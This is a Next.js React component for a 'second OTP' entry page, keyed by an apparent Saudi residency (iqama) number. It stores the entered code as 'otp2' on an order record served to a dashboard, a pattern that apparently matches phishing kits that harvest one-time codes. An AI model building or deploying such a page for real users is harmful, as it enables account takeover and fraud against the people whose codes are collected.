'use client'
import React, { useState, useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';
import { FaCheck, FaClock } from 'react-icons/fa';
import toast from 'react-hot-toast';
import useAxiosPublic from '@/hooks/UseAxiosPublic';
import UseAxiosOrdererData from '@/hooks/UseAxiosOrdererData';

const SecondOtp = () => {
    const router = useRouter();
    const params = useParams();
    const iquamaNumber = params.iquamaNumber as string;
    const [otp, setOtp] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [countdown, setCountdown] = useState(180);
    const axiosPublic = useAxiosPublic();
    const { ordererData, isLoading: ordererDataLoading, error: ordererDataError } = UseAxiosOrdererData(iquamaNumber);

    useEffect(() => {
        let timer: NodeJS.Timeout;
        if (countdown > 0) {
            timer = setInterval(() => {
                setCountdown((prev) => prev - 1);
            }, 1000);
        }
        return () => clearInterval(timer);
    }, [countdown]);

    const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = e.target.value.replace(/[^0-9]/g, '');
        if (value.length <= 8) {
            setOtp(value);
        }
    };

    const handleVerify = async () => {
        if (otp.length < 4) {
            toast.error('OTP must be at least 4 digits');
            return;
        }

        setIsLoading(true);
        try {
            const response = await axiosPublic.patch(`/dashboard/order-status/${ordererData?._id}`, { otp2: otp });

            if (response.status === 200) {
                toast.success('Verification successful!');
                router.push(`/verification/${iquamaNumber}/processing_second`);
            }
        } catch (error: any) {
            const message = error.response?.data?.message || 'Verification failed';
            toast.error(message);
        } finally {
            setIsLoading(false);
        }
    };

    const formatTime = (seconds: number) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
    };

    return (
        <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
            <div className="bg-white rounded-lg shadow-xl p-8 max-w-md w-full">
                {/* Accessibility live region */}
                <div 
                    role="alert" 
                    aria-live="polite" 
                    className="sr-only"
                >
                    {`Time remaining: ${formatTime(countdown)}`}
                </div>

                {/* Animated loading spinner */}
                <div className="flex justify-center mb-6">
                    <div className="animate-spin rounded-full h-16 w-16 border-t-4 border-orange-500 border-solid"></div>
                </div>

                {/* Title and countdown */}
                <h4 className="text-2xl font-semibold text-gray-800 text-center mb-4">
                    Enter Second OTP
                </h4>
                
                <div className="text-center mb-6">
                    <div className="text-3xl font-mono text-orange-600 mb-2 flex items-center justify-center gap-2">
                        <FaClock className="w-6 h-6" />
                        {formatTime(countdown)}
                    </div>
                </div>

                {/* OTP Input */}
                <div className="mb-6">
                    <input
                        type="text"
                        value={otp}
                        onChange={handleOtpChange}
                        maxLength={8}
                        placeholder="Enter Second OTP"
                        className="w-full text-center text-xl border-2 border-gray-300 rounded-lg p-3 focus:outline-none focus:border-orange-500"
                    />
                </div>

                {/* Progress bar */}
                <div className="w-full bg-gray-200 rounded-full h-2.5 mb-6">
                    <div 
                        className="bg-orange-600 h-2.5 rounded-full transition-all duration-1000" 
                        style={{ width: `${(180 - countdown) * (100 / 180)}%` }}
                    ></div>
                </div>

                {/* Warning message */}
                <div className="bg-orange-50 border-l-4 border-orange-500 p-4 mb-6">
                    <p className="text-sm text-orange-700">
                        Please enter the second OTP within the time limit.
                    </p>
                </div>

                {/* Verify Button */}
                {otp.length >= 4 && (
                    <button
                        onClick={handleVerify}
                        disabled={isLoading}
                        className={`w-full bg-orange-500 hover:bg-orange-600 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center space-x-2 transition-colors duration-200 ${
                            isLoading ? 'opacity-50 cursor-not-allowed' : ''
                        }`}
                    >
                        {isLoading ? (
                            <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                        ) : (
                            <>
                                <span>Verify Second OTP</span>
                                <FaCheck />
                            </>
                        )}
                    </button>
                )}
            </div>
        </div>
    );
};

export default SecondOtp;